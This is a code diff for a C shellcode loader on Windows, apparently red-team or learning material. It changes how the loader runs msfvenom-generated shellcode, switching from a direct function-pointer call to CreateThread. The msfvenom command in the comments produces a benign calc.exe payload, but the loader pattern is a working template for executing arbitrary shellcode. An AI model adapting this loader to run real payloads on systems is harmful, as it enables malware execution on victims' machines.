@@ -5,6 +5,7 @@
 int main(int argc, char const *argv[])
 {
     DWORD   oldProtection;
+    HANDLE  threadHandle;
 // msfvenom -p windows/x64/exec CMD="cmd.exe /C calc.exe" EXITFUNC=thread
 // --platform windows -a x64 -b "\x00\x0a\x0d" -f c -v exec
     unsigned char exec[] = 
@@ -47,7 +48,16 @@ int main(int argc, char const *argv[])
 
     MESSAGE(INFO, "Press <enter> to run bytes code...")
     getchar();
-    ((void(*)())func)();
+    
+    //((void(*)())func)();
+    threadHandle = CreateThread(NULL, resSize, (LPTHREAD_START_ROUTINE)func, NULL, 0, NULL);
+    if ( threadHandle == NULL){
+        MESSAGE(FAIL, "Impossible to create thread\n");
+        PRINT_ERROR(CreateThread);
+        return EXIT_FAILURE;
+    }
+    MESSAGE(OKAY, "Thread started\n");
+    WaitForSingleObject(threadHandle, INFINITE);
 
     return EXIT_SUCCESS;
 }
